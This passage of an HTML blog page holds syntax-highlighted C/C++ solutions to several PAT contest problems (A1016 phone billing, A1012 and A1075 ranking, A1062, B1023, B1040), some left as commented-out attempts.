class="keyword">if</span>(now[i].t&gt;=D)&#123;</span><br><span class="line">            ans+=now[i].price*D;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            D-=now[i].t;</span><br><span class="line">            ans+=now[i].sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1023</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int count[10]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">    int n;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;count[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(count[i]&gt;0)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;%d&quot;,i);</span></span><br><span class="line"><span class="comment">            count[i]--;</span></span><br><span class="line"><span class="comment">            break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;10;i++)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;count[i];j++)</span></span><br><span class="line"><span class="comment">            printf(&quot;%d&quot;,i);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-7"><a href="#4-7" class="headerlink" title="4.7"></a>4.7</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1040</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">100001</span>];</span><br><span class="line">    <span class="keyword">int</span> left[<span class="number">100001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span>)</span><br><span class="line">            left[i]=left[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">if</span>(str[i]==<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">            left[i]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> right=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=len<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i]==<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line">            right++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            ans=(ans+left[i]*right)%<span class="number">1000000007</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4-上机"><a href="#4-上机" class="headerlink" title="4(上机)"></a>4(上机)</h2><h3 id="4-1-1"><a href="#4-1-1" class="headerlink" title="4.1"></a>4.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1016</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">call</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">21</span>];</span><br><span class="line">    <span class="keyword">int</span> m,dd,hh,mm;</span><br><span class="line">    <span class="keyword">int</span> flag;  <span class="comment">//0 symbols off</span></span><br><span class="line">&#125;now[<span class="number">1001</span>],temp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> h[<span class="number">24</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(call a,call b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> eq=<span class="built_in">strcmp</span>(a.name,b.name);</span><br><span class="line">    <span class="keyword">if</span>(eq!=<span class="number">0</span>) <span class="keyword">return</span> eq&lt;<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(a.m!=b.m) <span class="keyword">return</span> a.m&lt;b.m;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(a.dd!=b.dd) <span class="keyword">return</span> a.dd&lt;b.dd;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(a.hh!=b.hh) <span class="keyword">return</span> a.hh&lt;b.hh;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> a.mm&lt;b.mm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> on,<span class="keyword">int</span> off,<span class="keyword">int</span> &amp;time,<span class="keyword">int</span> &amp;money)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    temp=now[on];</span><br><span class="line">    <span class="keyword">while</span>(temp.dd&lt;now[off].dd || temp.hh&lt;now[off].hh || temp.mm&lt;now[off].mm)&#123;</span><br><span class="line">        time++;</span><br><span class="line">        money+=h[temp.hh];</span><br><span class="line">        temp.mm++;</span><br><span class="line">        <span class="keyword">if</span>(temp.mm&gt;=<span class="number">60</span>)&#123;</span><br><span class="line">            temp.mm=<span class="number">0</span>;</span><br><span class="line">            temp.hh++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp.hh&gt;=<span class="number">24</span>)&#123;</span><br><span class="line">            temp.hh=<span class="number">0</span>;</span><br><span class="line">            temp.dd++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;h[i]);</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %d:%d:%d:%d %s&quot;</span>,now[i].name,&amp;now[i].m,&amp;now[i].dd,&amp;now[i].hh,&amp;now[i].mm,str);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,<span class="string">&quot;on-line&quot;</span>)==<span class="number">0</span>) now[i].flag=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> now[i].flag=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(now,now+N,cmp);</span><br><span class="line">    <span class="keyword">int</span> next=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> on=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> off=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(on&lt;N)&#123;</span><br><span class="line">        <span class="keyword">int</span> needPrint=<span class="number">0</span>;</span><br><span class="line">        next=on;</span><br><span class="line">        <span class="keyword">while</span>(next&lt;N&amp;&amp;<span class="built_in">strcmp</span>(now[next].name,now[on].name)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(needPrint==<span class="number">0</span>&amp;&amp;now[next].flag==<span class="number">1</span>) needPrint=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(needPrint==<span class="number">1</span>&amp;&amp;now[next].flag==<span class="number">0</span>) needPrint=<span class="number">2</span>;</span><br><span class="line">            next++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(needPrint&lt;<span class="number">2</span>)&#123;</span><br><span class="line">            on=next;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;  <span class="comment">//all cost</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s %02d\n&quot;</span>,now[on].name,now[on].m);</span><br><span class="line">        <span class="keyword">while</span>(on&lt;next)&#123;</span><br><span class="line">            <span class="keyword">while</span>(on&lt;next<span class="number">-1</span> &amp;&amp; !(now[on].flag==<span class="number">1</span>&amp;&amp;now[on+<span class="number">1</span>].flag==<span class="number">0</span>)) on++;</span><br><span class="line">            off=on+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(off==next)&#123;</span><br><span class="line">                on=next;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02d:%02d:%02d &quot;</span>,now[on].dd,now[on].hh,now[on].mm);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02d:%02d:%02d &quot;</span>,now[off].dd,now[off].hh,now[off].mm);</span><br><span class="line">            <span class="keyword">int</span> time=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> money=<span class="number">0</span>;</span><br><span class="line">            cal(on,off,time,money);</span><br><span class="line">            ans+=money;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d $%.2f\n&quot;</span>,time,money/<span class="number">100.0</span>);</span><br><span class="line">            on=off+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Total amount: $%.2f\n&quot;</span>,ans/<span class="number">100.0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1012</span></span><br><span class="line"><span class="comment">struct student</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int ID;</span></span><br><span class="line"><span class="comment">    int C,M,E;</span></span><br><span class="line"><span class="comment">    int C_rank,M_rank,E_rank;</span></span><br><span class="line"><span class="comment">    int A;</span></span><br><span class="line"><span class="comment">    int A_rank=0;</span></span><br><span class="line"><span class="comment">    int best_rank;</span></span><br><span class="line"><span class="comment">    char best_s;</span></span><br><span class="line"><span class="comment">&#125;now[2010];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bool C_j(student a,student b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    return a.C&gt;b.C;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bool M_j(student a,student b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    return a.M&gt;b.M;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bool E_j(student a,student b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    return a.E&gt;b.E;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bool A_j(student a,student b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    return a.A&gt;b.A;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">void best_rank(student &amp;a)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int best=min(a.A_rank,a.C_rank);</span></span><br><span class="line"><span class="comment">    best=min(best,a.E_rank);</span></span><br><span class="line"><span class="comment">    best=min(best,a.M_rank);</span></span><br><span class="line"><span class="comment">    if(a.A_rank==best)&#123;</span></span><br><span class="line"><span class="comment">        a.best_rank=best;</span></span><br><span class="line"><span class="comment">        a.best_s=&#x27;A&#x27;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else if(a.C_rank==best)&#123;</span></span><br><span class="line"><span class="comment">        a.best_rank=best;</span></span><br><span class="line"><span class="comment">        a.best_s=&#x27;C&#x27;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else if(a.M_rank==best)&#123;</span></span><br><span class="line"><span class="comment">        a.best_rank=best;</span></span><br><span class="line"><span class="comment">        a.best_s=&#x27;M&#x27;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else if(a.E_rank==best)&#123;</span></span><br><span class="line"><span class="comment">        a.best_rank=best;</span></span><br><span class="line"><span class="comment">        a.best_s=&#x27;E&#x27;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N,M;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;N,&amp;M);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d%d%d%d&quot;,&amp;now[i].ID,&amp;now[i].C,&amp;now[i].M,&amp;now[i].E);</span></span><br><span class="line"><span class="comment">        now[i].A=round((now[i].C+now[i].E+now[i].M)/3.0);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    sort(now,now+N,C_j);</span></span><br><span class="line"><span class="comment">    now[0].C_rank=1;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(now[i].C==now[i-1].C)</span></span><br><span class="line"><span class="comment">            now[i].C_rank=now[i-1].C_rank;</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            now[i].C_rank=i+1;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    sort(now,now+N,M_j);</span></span><br><span class="line"><span class="comment">    now[0].M_rank=1;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(now[i].M==now[i-1].M)</span></span><br><span class="line"><span class="comment">            now[i].M_rank=now[i-1].M_rank;</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            now[i].M_rank=i+1;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    sort(now,now+N,E_j);</span></span><br><span class="line"><span class="comment">    now[0].E_rank=1;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(now[i].E==now[i-1].E)</span></span><br><span class="line"><span class="comment">            now[i].E_rank=now[i-1].E_rank;</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            now[i].E_rank=i+1;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    sort(now,now+N,A_j);</span></span><br><span class="line"><span class="comment">    now[0].A_rank=1;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(now[i].A==now[i-1].A)</span></span><br><span class="line"><span class="comment">            now[i].A_rank=now[i-1].A_rank;</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            now[i].A_rank=i+1;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        best_rank(now[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int temp;</span></span><br><span class="line"><span class="comment">    int j;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;M;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;temp);</span></span><br><span class="line"><span class="comment">        for(j=0;j&lt;N;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(now[j].ID==temp)&#123;</span></span><br><span class="line"><span class="comment">                printf(&quot;%d %c\n&quot;,now[j].best_rank,now[j].best_s);</span></span><br><span class="line"><span class="comment">                break;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(j==N)</span></span><br><span class="line"><span class="comment">            printf(&quot;N/A\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1062</span></span><br><span class="line"><span class="comment">struct person</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    long long ID;</span></span><br><span class="line"><span class="comment">    int v;</span></span><br><span class="line"><span class="comment">    int t;</span></span><br><span class="line"><span class="comment">    int flag; //category</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bool sages(person a,person b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    if(a.flag!=b.flag) return a.flag&lt;b.flag;</span></span><br><span class="line"><span class="comment">    else if((a.t+a.v)!=(b.t+b.v)) return (a.t+a.v)&gt;(b.t+b.v);</span></span><br><span class="line"><span class="comment">    else if(a.v!=b.v) return a.v&gt;b.v;</span></span><br><span class="line"><span class="comment">    else return a.ID&lt;b.ID;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N,L,H;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d%d&quot;,&amp;N,&amp;L,&amp;H);</span></span><br><span class="line"><span class="comment">    int valid=N;</span></span><br><span class="line"><span class="comment">    person now[N];</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%lld%d%d&quot;,&amp;now[i].ID,&amp;now[i].v,&amp;now[i].t);</span></span><br><span class="line"><span class="comment">        if(now[i].t&gt;=H&amp;&amp;now[i].v&gt;=H)</span></span><br><span class="line"><span class="comment">            now[i].flag=1;</span></span><br><span class="line"><span class="comment">        else if(now[i].t&lt;H&amp;&amp;now[i].v&gt;=H&amp;&amp;now[i].t&gt;=L)</span></span><br><span class="line"><span class="comment">            now[i].flag=2;</span></span><br><span class="line"><span class="comment">        else if(now[i].t&lt;H&amp;&amp;now[i].v&lt;H&amp;&amp;now[i].v&gt;=now[i].t&amp;&amp;now[i].t&gt;=L)</span></span><br><span class="line"><span class="comment">            now[i].flag=3;</span></span><br><span class="line"><span class="comment">        else if(now[i].t&gt;=L&amp;&amp;now[i].v&gt;=L)</span></span><br><span class="line"><span class="comment">            now[i].flag=4;</span></span><br><span class="line"><span class="comment">        else if(now[i].t&lt;L||now[i].v&lt;L)&#123;</span></span><br><span class="line"><span class="comment">            valid--;</span></span><br><span class="line"><span class="comment">            now[i].flag=5;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    sort(now,now+N,sages);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d\n&quot;,valid);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;valid;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%lld %d %d\n&quot;,now[i].ID,now[i].v,now[i].t);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1075</span></span><br><span class="line"><span class="keyword">int</span> k[<span class="number">6</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> score[<span class="number">6</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> id=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> pass=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> rank;</span><br><span class="line">&#125;now[<span class="number">10010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(person a,person b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.sum!=b.sum) <span class="keyword">return</span> a.sum&gt;b.sum;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(a.flag!=b.flag) <span class="keyword">return</span> a.flag&gt;b.flag;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> a.id&lt;b.id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N,K,M;</span><br><span class="line">    <span class="keyword">int</span> temp_usr;</span><br><span class="line">    <span class="keyword">int</span> temp_pro;</span><br><span class="line">    <span class="keyword">int</span> temp_sco;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10010</span>;i++)&#123;</span><br><span class="line">        now[i].id=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;N,&amp;K,&amp;M);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=K;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;temp_usr,&amp;temp_pro,&amp;temp_sco);</span><br><span class="line">        <span class="comment">//now[temp_usr].id=temp_usr;</span></span><br><span class="line">        <span class="keyword">if</span>(temp_sco!=<span class="number">-1</span>) now[temp_usr].pass++;</span><br><span class="line">        <span class="keyword">if</span>(temp_sco==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(now[temp_usr].score[temp_pro]==<span class="number">-1</span>)</span><br><span class="line">                now[temp_usr].score[temp_pro]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(now[temp_usr].score[temp_pro]&lt;temp_sco)&#123;</span><br><span class="line">            now[temp_usr].score[temp_pro]=temp_sco;</span><br><span class="line">            <span class="keyword">if</span>(temp_sco==k[temp_pro])</span><br><span class="line">                now[temp_usr].flag++;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=K;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(now[i].score[j]!=<span class="number">-1</span>)</span><br><span class="line">                now[i].sum+=now[i].score[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(now+<span class="number">1</span>,now+<span class="number">1</span>+N,cmp);</span><br><span class="line">    now[<span class="number">1</span>].rank=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(now[i].sum==now[i<span class="number">-1</span>].sum)</span><br><span class="line">            now[i].rank=now[i<span class="number">-1</span>].rank;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            now[i].rank=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(now[i].pass==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %05d %d&quot;</span>,now[i].rank,now[i].id,now[i].sum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=K;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(now[i].score[j]!=<span class="number">-1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,now[i].score[j]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; -&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 